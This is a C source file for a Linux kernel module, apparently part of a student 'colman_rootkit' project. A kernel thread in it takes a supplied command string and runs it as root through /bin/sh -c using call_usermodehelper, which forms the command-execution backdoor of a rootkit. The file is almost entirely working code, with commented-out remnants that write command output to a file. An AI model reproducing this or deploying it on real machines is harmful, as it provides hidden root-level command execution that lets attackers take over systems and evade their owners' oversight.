#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 11, 0)
#include <linux/sched/signal.h>
#endif
#include "usermode.h"

#define MAX_CMD_LEN 500

int run_usermode_cmd(char * cmd, size_t len);

int simple( void *arguments)
{
    run_cmd_args * args = (run_cmd_args*)arguments;
    printk(KERN_INFO "[+] Colman: Init thread.");
    while (!kthread_should_stop())
    {
        if (args)
        {
            //printk(KERN_INFO "[+] Colman: Arg_len = %d.", args->arg_len);
            printk(KERN_INFO "[+] Colman: Simple thread\n");
            if (args->arg_len && args->arg)
            {
                if (run_usermode_cmd(args->arg, args->arg_len) != 0)
                {
                    printk(KERN_INFO "[-] Colman: Somthing with the usermode_cmd went wrong.");
                }
            }
            else
            {
                printk(KERN_INFO "[-] Colman: The args are not full.");
            }
        }
        else
        {
            printk(KERN_INFO "[-] Colman: The args are not full.");
        }

        set_current_state(TASK_INTERRUPTIBLE);
        schedule();
    }
    printk(KERN_INFO "[+] Colman: Close thread.");
    do_exit(0);
}

int run_usermode_cmd(char * cmd, size_t len)
{
    struct subprocess_info *sub_info;
    //char final_cmd[MAX_CMD_LEN];
    char * argv[] = { "/bin/sh", "-c", cmd , NULL };
    static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 
    //char tmp_output[] = "ls > /home/shahart/colman_rootkit/output";
    //unsigned int arg_len = strlen(tmp_output);

    if (cmd == NULL || len == 0)
    {
        printk(KERN_INFO "[-] Colman: Failed to pass arguments.");
        goto exit_with_error;
    }
    //printk(KERN_INFO "here! len! %d\n", args->arg_len);
    //run_cmd_args * a = (run_cmd_args *)arguments;
    
    
    //char output_file_cmd[] = " > /home/shahart/colman_rootkit/output";
    
    //memcpy(final_cmd, tmp_output, arg_len);
    //final_cmd[arg_len] = 0x0;
    
    //char * final_cmd = kmalloc(sizeof(char) * (strlen(arg) + strlen(output_file_cmd) + 2), GFP_ATOMIC );

    //memcpy(final_cmd, arg, strlen(arg));
    //memcpy(final_cmd + strlen(arg), output_file_cmd, strlen(output_file_cmd) + 1);


    printk(KERN_INFO "[+] Colman: command: %s.\n", cmd);
    sub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC, NULL,NULL,NULL );    
    if (!sub_info)
        goto exit_with_error;

    call_usermodehelper_exec( sub_info, UMH_WAIT_PROC );

    return 0;

exit_with_error:
    return -1;
}

